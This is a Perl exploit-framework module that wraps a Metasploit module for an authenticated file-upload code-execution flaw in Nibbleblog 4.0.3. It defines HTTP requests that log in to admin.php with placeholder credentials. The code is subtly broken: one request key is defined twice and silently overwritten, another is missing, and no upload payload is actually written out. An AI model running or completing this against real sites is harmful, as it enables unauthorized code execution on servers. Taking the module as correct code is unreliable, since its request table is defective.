package NIBBLEBLOG::MSF::NibbleblogFileUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "NibbleblogFileUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CONTENT     => "private",
  DESCRIPTION => "

          Nibbleblog contains a flaw that allows an authenticated remote

          attacker to execute arbitrary PHP code. This module was

          tested on version 4.0.3.

        ",
  MSF_MODULE  => "nibbleblog_file_upload",
  PATHS       => [""],
  REFERENCES  => [
                   "http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html",
                 ],
  TITLE       => "Nibbleblog File Upload Vulnerability",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to the web application", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'admin.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /admin.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'admin.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #3 Request : [POST] /admin.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
